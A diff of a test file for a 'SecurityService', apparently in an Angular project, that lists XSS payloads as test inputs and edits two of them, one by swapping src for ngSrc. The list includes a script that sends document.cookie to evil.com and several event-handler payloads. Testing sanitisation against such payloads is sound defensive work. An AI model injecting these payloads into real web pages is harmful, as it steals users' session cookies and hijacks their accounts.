@@ -146,14 +146,14 @@ describe('SecurityService', () => {
   describe('Scénarios d\'injection XSS', () => {
     const xssPayloads = [
       '<script>document.location="http://evil.com/?c="+document.cookie</script>',
-      '<img src=x onerror=alert(1) alt="test-x">',
+      '<img ngSrc="x" onerror=alert(1) alt="test-x" fill>',
       '<svg onload=alert(1)>',
       'javascript:alert(document.domain)',
       '<iframe src="javascript:alert(1)">',
       '<body onload=alert(1)>',
       '<input onfocus=alert(1) autofocus>',
       '<marquee onstart=alert(1)>',
-      '<video><source onerror="alert(1)">',
+      '<video><source onerror="alert(1)" src="x"></video>',
       '<math><maction actiontype="statusline#http://evil.com">CLICKME</maction></math>'
     ];
 
